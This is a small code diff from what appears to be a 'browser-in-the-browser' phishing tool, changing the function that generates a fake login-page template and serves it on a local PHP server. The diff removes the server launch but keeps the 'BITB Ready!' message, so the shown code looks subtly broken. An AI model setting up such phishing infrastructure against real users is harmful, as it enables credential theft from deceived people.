@@ -40,8 +40,8 @@ def open_server(domain_name, dir_name, login_page, site_title, btn_text):
     print(cl("green", "[+] Template generated successfully."))
     print(cl("blue", "[*] Starting PHP Server on port 8080..."))
     
-    subprocess.run(["pkill", "-f", "php -S 0.0.0.0:8080 router.php"], capture_output=True)
-    subprocess.Popen(["php", "-S", "0.0.0.0:8080", "router.php"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    if os.name != "nt":
+        subprocess.run(["pkill", "-f", "php -S 0.0.0.0:8080 router.php"], capture_output=True)
     
     print(cl("green", "[+] BITB Ready!"))
 
